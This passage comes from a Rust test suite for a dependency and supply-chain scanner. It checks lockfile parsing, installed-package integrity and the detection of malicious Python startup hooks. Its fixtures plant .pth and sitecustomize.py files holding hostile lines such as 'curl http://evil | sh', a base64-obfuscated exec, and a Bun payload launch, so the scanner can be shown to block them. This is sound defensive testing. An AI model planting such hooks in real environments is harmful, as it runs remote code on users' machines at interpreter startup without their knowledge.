        .unwrap();
        std::fs::write(
            sub.join("package.json"),
            r#"{"dependencies":{"shared-dep":"1.0.0"}}"#,
        )
        .unwrap();

        let calls = RefCell::new(0usize);
        let resolver = |_eco: Ecosystem, _name: &str| {
            *calls.borrow_mut() += 1;
            ApiSignals::offline()
        };
        let never_allowlisted = |_eco: Ecosystem, _name: &str| false;
        let request = ScanRequest {
            root: dir.path(),
            db: None,
            online: OnlineMode::Resolver(&resolver),
            is_allowlisted: &never_allowlisted,
            mode: ScanMode::Manifests,
            installed_max_entries: DEFAULT_MAX_INSTALLED_ENTRIES,
            policy: None,
        };
        let report = scan(&request);
        assert!(report.online);
        assert_eq!(report.dependency_count, 2, "declared in two manifests");
        assert_eq!(
            *calls.borrow(),
            1,
            "the resolver must be memoized per distinct package"
        );
    }

    // Installed-tree mode fixtures live here (not in tests/fixtures/, which is
    // the command-line `tirith check` format). Signed-threat-DB block fixtures
    // are exercised by the integration tests in cli_integration.rs.

    fn never_allow(_eco: Ecosystem, _name: &str) -> bool {
        false
    }

    #[test]
    fn installed_mode_positive_node_modules_surfaces_assessment() {
        // Without a threat DB no name-based finding fires, but the package must
        // still surface as a DeclaredDependency with mode "installed". The
        // BLOCK side is in cli_integration.rs (signed threat-DB fixture).
        let dir = tempfile::tempdir().unwrap();
        let pkg = dir.path().join("node_modules").join("evil-package");
        std::fs::create_dir_all(&pkg).unwrap();
        std::fs::write(
            pkg.join("package.json"),
            r#"{"name":"evil-package","version":"1.0.0"}"#,
        )
        .unwrap();

        let request = ScanRequest {
            root: dir.path(),
            db: None,
            online: OnlineMode::Off,
            is_allowlisted: &never_allow,
            mode: ScanMode::Installed,
            installed_max_entries: DEFAULT_MAX_INSTALLED_ENTRIES,
            policy: None,
        };
        let report = scan(&request);
        assert_eq!(report.mode, "installed");
        assert_eq!(report.dependency_count, 1);
        assert_eq!(report.assessments[0].dependency.name, "evil-package");
        assert_eq!(
            report.assessments[0].dependency.version,
            VersionIntent::Resolved("1.0.0".to_string())
        );
        assert_eq!(report.assessments[0].dependency.ecosystem, Ecosystem::Npm);
    }

    /// Build an in-memory signed threat DB whose only record is a PyPI package
    /// `eco_name` malicious at exactly `affected` (version-specific, not
    /// all-versions). Used to exercise the installed-METADATA path (A1e).
    fn threat_db_with_pypi_version(eco_name: &str, affected: &str) -> ThreatDb {
        use ed25519_dalek::SigningKey;
        use rand_core::OsRng;
        let key = SigningKey::generate(&mut OsRng);
        let mut writer = crate::threatdb::ThreatDbWriter::new(1700000000, 5);
        writer.add_package(
            Ecosystem::PyPI,
            eco_name,
            &[affected],
            crate::threatdb::ThreatSource::OssfMalicious,
            crate::threatdb::Confidence::Confirmed,
            false,
            Some("https://example.com/advisory/installed"),
        );
        let bytes = writer.build(&key).expect("build test DB");
        ThreatDb::from_bytes(bytes, 0).expect("load test DB")
    }

    /// Plant a `<root>/site-packages/<name>-<ver>.dist-info/METADATA` file.
    fn plant_dist_info(root: &Path, name: &str, version: &str) {
        let dist = root
            .join("site-packages")
            .join(format!("{name}-{version}.dist-info"));
        std::fs::create_dir_all(&dist).unwrap();
        std::fs::write(
            dist.join("METADATA"),
            format!("Metadata-Version: 2.1\nName: {name}\nVersion: {version}\n"),
        )
        .unwrap();
    }

    #[test]
    fn installed_mode_known_malicious_metadata_blocks() {
        // An installed distribution whose concrete version is in the malicious
        // record is an EXACT match: it blocks via ThreatMaliciousPackage, not
        // the unresolved warn.
        let dir = tempfile::tempdir().unwrap();
        plant_dist_info(dir.path(), "evil-installed", "2.3.4");
        let db = threat_db_with_pypi_version("evil-installed", "2.3.4");

        let request = ScanRequest {
            root: dir.path(),
            db: Some(&db),
            online: OnlineMode::Off,
            is_allowlisted: &never_allow,
            mode: ScanMode::Installed,
            installed_max_entries: DEFAULT_MAX_INSTALLED_ENTRIES,
            policy: None,
        };
        let report = scan(&request);
        assert_eq!(report.dependency_count, 1);
        assert_eq!(report.assessments[0].dependency.name, "evil-installed");
        assert_eq!(
            report.assessments[0].dependency.version,
            VersionIntent::Resolved("2.3.4".to_string())
        );
        assert_eq!(report.verdict.action, Action::Block);
        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
        assert!(
            rules.contains(&RuleId::ThreatMaliciousPackage),
            "an installed affected version must block as a confirmed exact match; got {rules:?}"
        );
        assert!(
            !rules.contains(&RuleId::ThreatUnresolvedMaliciousPackage),
            "a resolved exact hit must NOT emit the unresolved warn"
        );
    }

    #[test]
    fn installed_mode_non_affected_metadata_is_clean() {
        // The installed version is NOT in the malicious record, so there is no
        // finding at all (NoRecord for this exact version).
        let dir = tempfile::tempdir().unwrap();
        plant_dist_info(dir.path(), "evil-installed", "9.9.9");
        let db = threat_db_with_pypi_version("evil-installed", "2.3.4");

        let request = ScanRequest {
            root: dir.path(),
            db: Some(&db),
            online: OnlineMode::Off,
            is_allowlisted: &never_allow,
            mode: ScanMode::Installed,
            installed_max_entries: DEFAULT_MAX_INSTALLED_ENTRIES,
            policy: None,
        };
        let report = scan(&request);
        assert_eq!(report.dependency_count, 1);
        assert_eq!(report.verdict.action, Action::Allow);
        assert!(report.assessments[0].threat_assessment.is_none());
    }

    #[test]
    fn installed_mode_clean_node_modules_allows() {
        // Three benign packages in node_modules — none known-malicious, none
        // slopsquat-shaped → verdict ALLOW. The wider integration suite uses
        // the signed test threat DB to verify the BLOCK side of this case.
        let dir = tempfile::tempdir().unwrap();
        for (pkg, version) in [
            ("react", "18.2.0"),
            ("left-pad", "1.3.0"),
            ("lodash", "4.17.21"),
        ] {
            let p = dir.path().join("node_modules").join(pkg);
            std::fs::create_dir_all(&p).unwrap();
            std::fs::write(
                p.join("package.json"),
                format!(r#"{{"name":"{pkg}","version":"{version}"}}"#),
            )
            .unwrap();
        }

        let request = ScanRequest {
            root: dir.path(),
            db: None,
            online: OnlineMode::Off,
            is_allowlisted: &never_allow,
            mode: ScanMode::Installed,
            installed_max_entries: DEFAULT_MAX_INSTALLED_ENTRIES,
            policy: None,
        };
        let report = scan(&request);
        assert_eq!(report.mode, "installed");
        assert_eq!(report.dependency_count, 3);
        assert_eq!(
            report.verdict.action,
            Action::Allow,
            "three benign packages must ALLOW; findings: {:?}",
            report.verdict.findings,
        );
    }

    #[test]
    fn specific_lockfile_with_named_dep_surfaces_assessment() {
        // A package-lock.json that pins a package by name is parsed via
        // SpecificLockfile mode and surfaces one DeclaredDependency per
        // resolved package. mode field reads "specific_lockfile".
        let dir = tempfile::tempdir().unwrap();
        let lockfile = dir.path().join("package-lock.json");
        std::fs::write(
            &lockfile,
            r#"{
              "name": "demo",
              "lockfileVersion": 3,
              "packages": {
                "": {"name":"demo","version":"1.0.0"},
                "node_modules/evil-package": {"version":"1.0.0"}
              }
            }"#,
        )
        .unwrap();

        let request = ScanRequest {
            root: &lockfile,
            db: None,
            online: OnlineMode::Off,
            is_allowlisted: &never_allow,
            mode: ScanMode::SpecificLockfile(lockfile.clone()),
            installed_max_entries: DEFAULT_MAX_INSTALLED_ENTRIES,
            policy: None,
        };
        let report = scan(&request);
        assert_eq!(report.mode, "specific_lockfile");
        assert_eq!(report.dependency_count, 1);
        assert_eq!(report.assessments[0].dependency.name, "evil-package");
    }

    #[test]
    fn specific_lockfile_clean_allows() {
        // Same shape as above but with clean dependencies → ALLOW.
        let dir = tempfile::tempdir().unwrap();
        let lockfile = dir.path().join("package-lock.json");
        std::fs::write(
            &lockfile,
            r#"{
              "name": "demo",
              "lockfileVersion": 3,
              "packages": {
                "": {"name":"demo","version":"1.0.0"},
                "node_modules/react": {"version":"18.2.0"},
                "node_modules/lodash": {"version":"4.17.21"}
              }
            }"#,
        )
        .unwrap();

        let request = ScanRequest {
            root: &lockfile,
            db: None,
            online: OnlineMode::Off,
            is_allowlisted: &never_allow,
            mode: ScanMode::SpecificLockfile(lockfile.clone()),
            installed_max_entries: DEFAULT_MAX_INSTALLED_ENTRIES,
            policy: None,
        };
        let report = scan(&request);
        assert_eq!(report.mode, "specific_lockfile");
        assert_eq!(report.dependency_count, 2);
        assert_eq!(
            report.verdict.action,
            Action::Allow,
            "two clean deps in a lockfile must ALLOW: {:?}",
            report.verdict.findings,
        );
    }

    #[test]
    fn installed_mode_respects_max_entries_cap() {
        // Five packages under node_modules, cap at 2 → only 2 scored, and a
        // truncation note recorded.
        let dir = tempfile::tempdir().unwrap();
        for name in ["a-pkg", "b-pkg", "c-pkg", "d-pkg", "e-pkg"] {
            let p = dir.path().join("node_modules").join(name);
            std::fs::create_dir_all(&p).unwrap();
            std::fs::write(
                p.join("package.json"),
                format!(r#"{{"name":"{name}","version":"1.0.0"}}"#),
            )
            .unwrap();
        }

        let request = ScanRequest {
            root: dir.path(),
            db: None,
            online: OnlineMode::Off,
            is_allowlisted: &never_allow,
            mode: ScanMode::Installed,
            // The MIN_INSTALLED_ENTRIES check lives at the CLI; the engine
            // accepts any non-zero cap.
            installed_max_entries: 2,
            policy: None,
        };
        let report = scan(&request);
        assert_eq!(
            report.dependency_count, 2,
            "the cap must stop the walk early"
        );
        assert!(
            report.notes.iter().any(|n| n.note.contains("truncated")),
            "a truncation note must be recorded: {:?}",
            report.notes
        );
    }

    #[test]
    fn installed_mode_reads_dist_info_metadata() {
        // A synthetic site-packages with one `.dist-info/METADATA` entry must
        // be discovered as a PyPI dependency.
        let dir = tempfile::tempdir().unwrap();
        let dist = dir
            .path()
            .join("site-packages")
            .join("flask-3.0.0.dist-info");
        std::fs::create_dir_all(&dist).unwrap();
        std::fs::write(
            dist.join("METADATA"),
            "Metadata-Version: 2.1\nName: flask\nVersion: 3.0.0\n\nA tiny WSGI framework.\n",
        )
        .unwrap();

        let request = ScanRequest {
            root: dir.path(),
            db: None,
            online: OnlineMode::Off,
            is_allowlisted: &never_allow,
            mode: ScanMode::Installed,
            installed_max_entries: DEFAULT_MAX_INSTALLED_ENTRIES,
            policy: None,
        };
        let report = scan(&request);
        assert_eq!(report.dependency_count, 1);
        assert_eq!(report.assessments[0].dependency.name, "flask");
        assert_eq!(report.assessments[0].dependency.ecosystem, Ecosystem::PyPI);
    }

    #[test]
    fn installed_mode_parses_cargo_lock_at_root() {
        // A workspace Cargo.lock at the scan root must be picked up in
        // installed mode and emit one DeclaredDependency per `[[package]]`.
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("Cargo.lock"),
            r#"version = 3
[[package]]
name = "anyhow"
version = "1.0.86"

[[package]]
name = "thiserror"
version = "1.0.61"
"#,
        )
        .unwrap();

        let request = ScanRequest {
            root: dir.path(),
            db: None,
            online: OnlineMode::Off,
            is_allowlisted: &never_allow,
            mode: ScanMode::Installed,
            installed_max_entries: DEFAULT_MAX_INSTALLED_ENTRIES,
            policy: None,
        };
        let report = scan(&request);
        assert_eq!(
            report.dependency_count, 2,
            "Cargo.lock declares two packages: {:?}",
            report.assessments
        );
        for a in &report.assessments {
            assert_eq!(a.dependency.ecosystem, Ecosystem::Crates);
        }
    }

    #[test]
    fn specific_lockfile_with_unrecognized_file_records_note() {
        // A bogus path passed via SpecificLockfile must surface a note rather
        // than crash. A piped consumer sees mode=specific_lockfile and
        // dependency_count=0, plus an explanatory note.
        let dir = tempfile::tempdir().unwrap();
        let bogus = dir.path().join("not-a-lockfile.json");
        std::fs::write(&bogus, "{}").unwrap();

        let request = ScanRequest {
            root: &bogus,
            db: None,
            online: OnlineMode::Off,
            is_allowlisted: &never_allow,
            mode: ScanMode::SpecificLockfile(bogus.clone()),
            installed_max_entries: DEFAULT_MAX_INSTALLED_ENTRIES,
            policy: None,
        };
        let report = scan(&request);
        assert_eq!(report.mode, "specific_lockfile");
        assert_eq!(report.dependency_count, 0);
        assert!(
            report
                .notes
                .iter()
                .any(|n| n.note.contains("not a recognized manifest format")),
            "must record a 'not recognized' note for an unknown file: {:?}",
            report.notes
        );
    }

    // ---- B5: installed-distribution integrity (end-to-end via scan) -----------

    /// A `sha256=<base64url-no-pad>` RECORD hash column for `bytes`.
    fn record_hash_col(bytes: &[u8]) -> String {
        use base64::Engine as _;
        use sha2::{Digest, Sha256};
        let digest = Sha256::digest(bytes);
        format!(
            "sha256={}",
            base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(digest)
        )
    }

    /// Plant a full installed PyPI distribution under `<root>/site-packages`:
    /// a `.dist-info/METADATA`, the given package files on disk, and a RECORD
    /// listing each file (`hash_matches` controls whether the recorded hash
    /// matches the bytes written; `false` plants a tamper). Extra `.dist-info`
    /// files (INSTALLER, direct_url.json) come from `extra_dist_info`. Returns the
    /// site-packages path.
    fn plant_installed_dist(
        root: &Path,
        name: &str,
        version: &str,
        files: &[(&str, &[u8])],
        hash_matches: bool,
        extra_dist_info: &[(&str, &[u8])],
    ) -> PathBuf {
        let site = root.join("site-packages");
        let dist_info = site.join(format!("{name}-{version}.dist-info"));
        std::fs::create_dir_all(&dist_info).unwrap();
        std::fs::write(
            dist_info.join("METADATA"),
            format!("Metadata-Version: 2.1\nName: {name}\nVersion: {version}\n"),
        )
        .unwrap();
        for (extra_name, body) in extra_dist_info {
            std::fs::write(dist_info.join(extra_name), body).unwrap();
        }
        let mut record = String::new();
        for (rel, body) in files {
            let p = site.join(rel);
            if let Some(parent) = p.parent() {
                std::fs::create_dir_all(parent).unwrap();
            }
            std::fs::write(&p, body).unwrap();
            let hash_body: &[u8] = if hash_matches {
                body
            } else {
                b"DIFFERENT bytes"
            };
            record.push_str(&format!(
                "{rel},{},{}\n",
                record_hash_col(hash_body),
                body.len()
            ));
        }
        // RECORD lists itself with empty hash/size.
        record.push_str(&format!("{name}-{version}.dist-info/RECORD,,\n"));
        std::fs::write(dist_info.join("RECORD"), record).unwrap();
        site
    }

    fn installed_request<'a>(root: &'a Path) -> ScanRequest<'a> {
        ScanRequest {
            root,
            db: None,
            online: OnlineMode::Off,
            is_allowlisted: &never_allow,
            mode: ScanMode::Installed,
            installed_max_entries: DEFAULT_MAX_INSTALLED_ENTRIES,
            policy: None,
        }
    }

    #[test]
    fn integrity_tampered_file_fires_violation() {
        let dir = tempfile::tempdir().unwrap();
        // hash_matches: false plants a RECORD hash that disagrees with the bytes.
        plant_installed_dist(
            dir.path(),
            "demo",
            "1.0",
            &[("demo/mod.py", b"on-disk bytes\n")],
            false,
            &[],
        );
        let report = scan(&installed_request(dir.path()));
        let integrity = report
            .integrity
            .as_ref()
            .expect("installed mode reports integrity");
        assert!(integrity.hash_mismatches >= 1, "a tamper must mismatch");
        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
        assert!(
            rules.contains(&RuleId::PythonInstalledIntegrityViolation),
            "a tampered installed file must fire the integrity violation; got {rules:?}"
        );
    }

    #[test]
    fn integrity_unowned_sitecustomize_fires_high() {
        let dir = tempfile::tempdir().unwrap();
        let site = plant_installed_dist(
            dir.path(),
            "demo",
            "1.0",
            &[("demo/__init__.py", b"x = 1\n")],
            true,
            &[],
        );
        // Plant a sitecustomize.py at the site root that NO distribution owns.
        std::fs::write(
            site.join("sitecustomize.py"),
            b"import os; os.system('curl evil')\n",
        )
        .unwrap();
        let report = scan(&installed_request(dir.path()));
        let integrity = report.integrity.as_ref().unwrap();
        assert_eq!(integrity.unowned_startup_hooks.len(), 1);
        let finding = report
            .verdict
            .findings
            .iter()
            .find(|f| f.rule_id == RuleId::PythonInstalledIntegrityViolation)
            .expect("unowned sitecustomize must fire the integrity violation");
        // An unowned startup hook is the High corroborator -> Block.
        assert_eq!(finding.severity, Severity::High);
        assert_eq!(report.verdict.action, Action::Block);
    }

    /// A sitecustomize.py whose owning distribution lists it in RECORD by ABSOLUTE
    /// path (as conda/system installs do) is OWNED, so it must NOT raise a false
    /// SitecustomizeUnowned (which would Block a clean environment).
    #[test]
    fn sitecustomize_owned_via_absolute_record_path_is_not_unowned() {
        let dir = tempfile::tempdir().unwrap();
        let site = dir.path().join("site-packages");
        std::fs::create_dir_all(&site).unwrap();
        let hook = site.join("sitecustomize.py");
        std::fs::write(&hook, b"import sys\n").unwrap();
        // A distribution that owns sitecustomize.py, listing it by ABSOLUTE path.
        let dist_info = site.join("owner-1.0.dist-info");
        std::fs::create_dir_all(&dist_info).unwrap();
        std::fs::write(
            dist_info.join("METADATA"),
            "Metadata-Version: 2.1\nName: owner\nVersion: 1.0\n",
        )
        .unwrap();
        std::fs::write(dist_info.join("RECORD"), format!("{},,\n", hook.display())).unwrap();

        let report = scan(&installed_request(dir.path()));
        let integrity = report.integrity.as_ref().unwrap();
        assert!(
            integrity.unowned_startup_hooks.is_empty(),
            "sitecustomize owned via an absolute RECORD path must not be flagged unowned"
        );
    }

    /// `read_dist_info_metadata` must not follow a symlinked METADATA out of the
    /// environment (it reads no-follow like every other `.dist-info` read).
    #[test]
    #[cfg(unix)]
    fn dist_info_metadata_symlink_is_not_followed() {
        use std::os::unix::fs::symlink;
        let dir = tempfile::tempdir().unwrap();
        let dist_info = dir.path().join("pkg-1.0.dist-info");
        std::fs::create_dir_all(&dist_info).unwrap();
        let outside = dir.path().join("outside-metadata");
        std::fs::write(
            &outside,
            "Metadata-Version: 2.1\nName: sneaky\nVersion: 9.9\n",
        )
        .unwrap();
        symlink(&outside, dist_info.join("METADATA")).unwrap();
        assert!(read_dist_info_metadata(&dist_info.join("METADATA")).is_none());
    }

    #[test]
    fn integrity_duplicate_owned_path_fires_violation() {
        let dir = tempfile::tempdir().unwrap();
        let site = dir.path().join("site-packages");
        // Two distributions whose RECORD both list the SAME module path.
        for (name, ver) in [("alpha", "1.0"), ("beta", "2.0")] {
            let dist_info = site.join(format!("{name}-{ver}.dist-info"));
            std::fs::create_dir_all(&dist_info).unwrap();
            std::fs::write(
                dist_info.join("METADATA"),
                format!("Metadata-Version: 2.1\nName: {name}\nVersion: {ver}\n"),
            )
            .unwrap();
            // Both list `shared/mod.py` (empty hash so neither mismatches).
            std::fs::write(dist_info.join("RECORD"), "shared/mod.py,,\n").unwrap();
        }
        let shared = site.join("shared");
        std::fs::create_dir_all(&shared).unwrap();
        std::fs::write(shared.join("mod.py"), b"shared\n").unwrap();

        let report = scan(&installed_request(dir.path()));
        let integrity = report.integrity.as_ref().unwrap();
        assert_eq!(
            integrity.duplicate_owned_paths.len(),
            1,
            "the shared path must be detected as duplicate-owned"
        );
        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
        assert!(rules.contains(&RuleId::PythonInstalledIntegrityViolation));
    }

    #[test]
    fn integrity_benign_numpy_shaped_so_no_block() {
        // A NumPy-shaped distribution: a compiled .so LISTED in RECORD with a
        // matching hash must not block.
        let dir = tempfile::tempdir().unwrap();
        plant_installed_dist(
            dir.path(),
            "numpyish",
            "1.26.0",
            &[
                ("numpyish/__init__.py", b"from . import _core\n"),
                (
                    "numpyish/_core.cpython-311-x86_64-linux-gnu.so",
                    b"\x7fELF fake\n",
                ),
            ],
            true,
            &[],
        );
        let report = scan(&installed_request(dir.path()));
        assert_ne!(
            report.verdict.action,
            Action::Block,
            "a NumPy-shaped dist with a listed, matching .so must not block"
        );
        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
        assert!(
            !rules.contains(&RuleId::PythonInstalledIntegrityViolation),
            "a clean compiled wheel must produce no integrity violation; got {rules:?}"
        );
    }

    #[test]
    fn integrity_benign_editable_install_no_block() {
        // An editable install: a sparse RECORD (listing only the dist-info and a
        // .pth-style pointer) and absent project files must not block.
        let dir = tempfile::tempdir().unwrap();
        let site = dir.path().join("site-packages");
        let dist_info = site.join("proj-0.1.0.dist-info");
        std::fs::create_dir_all(&dist_info).unwrap();
        std::fs::write(
            dist_info.join("METADATA"),
            "Metadata-Version: 2.1\nName: proj\nVersion: 0.1.0\n",
        )
        .unwrap();
        // direct_url.json marks it editable.
        std::fs::write(
            dist_info.join("direct_url.json"),
            br#"{"url":"file:///home/me/proj","dir_info":{"editable":true}}"#,
        )
        .unwrap();
        // RECORD references a project file that is NOT on disk (editable installs
        // legitimately point outside site-packages) plus RECORD itself.
        std::fs::write(
            dist_info.join("RECORD"),
            "proj/__init__.py,sha256=AAAA,10\nproj-0.1.0.dist-info/RECORD,,\n",
        )
        .unwrap();

        let report = scan(&installed_request(dir.path()));
        let integrity = report.integrity.as_ref().unwrap();
        assert!(integrity.distributions_checked >= 1);
        assert_ne!(
            report.verdict.action,
            Action::Block,
            "an editable install must not block on a sparse/absent-file RECORD"
        );
        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
        assert!(
            !rules.contains(&RuleId::PythonInstalledIntegrityViolation),
            "an editable install must not fire the integrity violation; got {rules:?}"
        );
    }

    #[test]
    fn integrity_benign_distro_managed_no_block() {
        // A distro/conda-style install: an INSTALLER naming a non-pip installer,
        // and unverifiable (empty-hash) RECORD rows. Divergence is legitimate; no
        // block.
        let dir = tempfile::tempdir().unwrap();
        plant_installed_dist(
            dir.path(),
            "distropkg",
            "3.0",
            &[("distropkg/__init__.py", b"# distro\n")],
            true,
            &[("INSTALLER", b"conda\n")],
        );
        let report = scan(&installed_request(dir.path()));
        assert_ne!(
            report.verdict.action,
            Action::Block,
            "a distro/conda-managed install must not block"
        );
        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
        assert!(!rules.contains(&RuleId::PythonInstalledIntegrityViolation));
    }

    #[test]
    fn integrity_absent_in_manifests_mode() {
        // The integrity report is only computed in `--installed` mode, so a
        // manifest-mode scan must leave it None (byte-identical JSON invariant).
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"dependencies":{"left-pad":"1.0.0"}}"#,
        )
        .unwrap();
        let mut req = installed_request(dir.path());
        req.mode = ScanMode::Manifests;
        let report = scan(&req);
        assert!(
            report.integrity.is_none(),
            "manifest-mode scan must not compute an integrity report"
        );
    }

    // ---- B6: Python startup-hook EXECUTION (end-to-end via scan) ---------------

    /// Plant a bare `site-packages` root with one named startup-hook file at its
    /// top level (a `.pth`/`.start`/`sitecustomize.py`), plus a single owned dist
    /// so the tree is a realistic install. Returns the root (pass to
    /// `installed_request`).
    fn plant_startup_hook(root: &Path, hook_name: &str, body: &[u8]) -> PathBuf {
        // A minimal owned distribution so the root looks like a real env.
        let site = plant_installed_dist(
            root,
            "base",
            "1.0",
            &[("base/__init__.py", b"x = 1\n")],
            true,
            &[],
        );
        std::fs::write(site.join(hook_name), body).unwrap();
        root.to_path_buf()
    }

    #[test]
    fn startup_pth_os_system_fires_suspicious() {
        let dir = tempfile::tempdir().unwrap();
        // A `.pth` whose import line runs a shell at interpreter start.
        plant_startup_hook(
            dir.path(),
            "evil.pth",
            b"import os; os.system('curl http://evil/x | sh')\n",
        );
        let report = scan(&installed_request(dir.path()));
        let integrity = report.integrity.as_ref().unwrap();
        assert!(
            !integrity.startup_signals.is_empty(),
            "the executing .pth must record startup signals"
        );
        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
        assert!(
            rules.contains(&RuleId::PythonStartupHookSuspicious),
            "an os.system .pth must fire the suspicious finding; got {rules:?}"
        );
        // High -> Block.
        assert_eq!(report.verdict.action, Action::Block);
    }

    #[test]
    fn startup_pth_cross_runtime_fires_critical() {
        let dir = tempfile::tempdir().unwrap();
        // A `.pth` that launches Bun against a sibling JS payload (the campaign's
        // cross-distribution split). Renaming the script must not evade, so the
        // rule keys on `bun`, not the filename.
        plant_startup_hook(
            dir.path(),
            "loader.pth",
            b"import subprocess; subprocess.Popen(['bun', 'run', 'payload/anything.js'])\n",
        );
        let report = scan(&installed_request(dir.path()));
        let integrity = report.integrity.as_ref().unwrap();
        assert!(
            integrity.startup_cross_runtime,
            "a Bun launch must set the cross-runtime flag"
        );
        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
        assert!(
            rules.contains(&RuleId::PythonStartupHookCrossRuntime),
            "a Bun-launching .pth must fire the cross-runtime finding; got {rules:?}"
        );
        let finding = report
            .verdict
            .findings
            .iter()
            .find(|f| f.rule_id == RuleId::PythonStartupHookCrossRuntime)
            .unwrap();
        assert_eq!(finding.severity, Severity::Critical);
        assert_eq!(report.verdict.action, Action::Block);
    }

    #[test]
    fn startup_pth_base64_obfuscated_fires_suspicious() {
        use base64::Engine as _;
        let dir = tempfile::tempdir().unwrap();
        let inner = "os.system('id')";
        let encoded = base64::engine::general_purpose::STANDARD.encode(inner);
        let body = format!("import base64; exec(base64.b64decode('{encoded}'))\n");
        plant_startup_hook(dir.path(), "hidden.pth", body.as_bytes());
        let report = scan(&installed_request(dir.path()));
        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
        assert!(
            rules.contains(&RuleId::PythonStartupHookSuspicious),
            "a base64-obfuscated exec .pth must fire suspicious; got {rules:?}"
        );
    }

    #[test]
    fn startup_pth_tmp_path_addition_alone_does_not_block() {
        let dir = tempfile::tempdir().unwrap();
        // A NON-executing path-add line pointing at /tmp: a signal, but on its own
        // (no executing line) it does not promote to a Block.
        plant_startup_hook(dir.path(), "paths.pth", b"/tmp/attacker\n");
        let report = scan(&installed_request(dir.path()));
        let integrity = report.integrity.as_ref().unwrap();
        // The untrusted-path signal is recorded.
        assert!(
            integrity.startup_signals.iter().any(|s| matches!(
                s.kind,
                crate::artifact::ArtifactSignalKind::PthUntrustedPathAddition
            )),
            "the /tmp path-add must record an untrusted-path signal"
        );
        // But with no executing line, no suspicious finding and no Block.
        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
        assert!(
            !rules.contains(&RuleId::PythonStartupHookSuspicious),
            "a bare path-add must not promote to the suspicious finding; got {rules:?}"
        );
        assert_ne!(report.verdict.action, Action::Block);
    }

    #[test]
    fn startup_benign_namespace_pth_stays_clean() {
        let dir = tempfile::tempdir().unwrap();
        // A canonical setuptools namespace bootstrap: it begins with `import` and
        // executes, but is a recognized benign template -> no startup finding.
        let body =
            b"import sys, types, os; m = sys.modules.setdefault('ns', types.ModuleType('ns'))\n";
        plant_startup_hook(dir.path(), "ns-nspkg.pth", body);
        let report = scan(&installed_request(dir.path()));
        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
        assert!(
            !rules.contains(&RuleId::PythonStartupHookSuspicious)
                && !rules.contains(&RuleId::PythonStartupHookCrossRuntime),
            "a benign namespace .pth must produce no startup finding; got {rules:?}"
        );
        assert_ne!(report.verdict.action, Action::Block);
    }

    #[test]
    fn startup_benign_editable_pth_stays_clean() {
        let dir = tempfile::tempdir().unwrap();
        // A setuptools editable finder bootstrap: a known template -> clean.
        let body = b"import __editable___base_1_0_finder; __editable___base_1_0_finder.install()\n";
        plant_startup_hook(dir.path(), "__editable__.base-1.0.pth", body);
        let report = scan(&installed_request(dir.path()));
        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
        assert!(
            !rules.contains(&RuleId::PythonStartupHookSuspicious),
            "a benign editable .pth must produce no startup finding; got {rules:?}"
        );
    }

    #[test]
    fn startup_tampered_editable_pth_fires() {
        let dir = tempfile::tempdir().unwrap();
        // The editable template PLUS an appended malicious call: the complete line
        // no longer matches the template, so it is analyzed and fires.
        let body = b"import __editable___base_1_0_finder; __editable___base_1_0_finder.install(); __import__('os').system('curl http://evil | sh')\n";
        plant_startup_hook(dir.path(), "__editable__.base-1.0.pth", body);
        let report = scan(&installed_request(dir.path()));
        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
        assert!(
            rules.contains(&RuleId::PythonStartupHookSuspicious),
            "a tampered editable template must fire suspicious; got {rules:?}"
        );
    }

    #[test]
    fn startup_sitecustomize_body_fires_and_unowned_corroborates() {
        let dir = tempfile::tempdir().unwrap();
        // An unowned sitecustomize.py whose MODULE body spawns a shell: B5's
        // unowned-hook integrity violation AND B6's startup-suspicious both fire.
        plant_startup_hook(
            dir.path(),
            "sitecustomize.py",
            b"import os\nos.system('curl http://evil | sh')\n",
        );
        let report = scan(&installed_request(dir.path()));
        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
        assert!(
            rules.contains(&RuleId::PythonStartupHookSuspicious),
            "an executing sitecustomize body must fire suspicious; got {rules:?}"
        );
        assert!(
            rules.contains(&RuleId::PythonInstalledIntegrityViolation),
            "the unowned sitecustomize must also fire the B5 integrity violation"
        );
        assert_eq!(report.verdict.action, Action::Block);
    }

    #[test]
    fn startup_clean_env_no_startup_findings() {
        // A realistic clean env with an editable `.pth` pointer and a numpy-shaped
        // dist must produce NO startup finding (negative control).
        let dir = tempfile::tempdir().unwrap();
        let site = plant_installed_dist(
            dir.path(),
            "numpyish",
            "1.26.0",
            &[
                ("numpyish/__init__.py", b"from . import _core\n"),
                (
                    "numpyish/_core.cpython-311-x86_64-linux-gnu.so",
                    b"\x7fELF fake\n",
                ),
            ],
            true,
            &[],
        );
        // A plain editable `.pth` that only adds a project directory (path-add).
        std::fs::write(site.join("project.pth"), b"/home/me/project/src\n").unwrap();
        let report = scan(&installed_request(dir.path()));
        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
        assert!(
            !rules.contains(&RuleId::PythonStartupHookSuspicious)
                && !rules.contains(&RuleId::PythonStartupHookCrossRuntime),
            "a clean env must produce no startup finding; got {rules:?}"
        );
        assert_ne!(report.verdict.action, Action::Block);
    }

    #[test]
    fn sitecustomize_with_only_sys_path_insert_is_clean() {
        // A legitimate sitecustomize whose ONLY action is a sys.path insert. It
        // executes (module body) and records a `PthSysPathSearch` signal, but
        // sys.path manipulation alone is NOT a danger leg (T3.16/T2.11), so it must
        // NOT fire the suspicious finding. (The unowned-hook B5 integrity violation
        // may still fire; that is a separate, expected signal.)
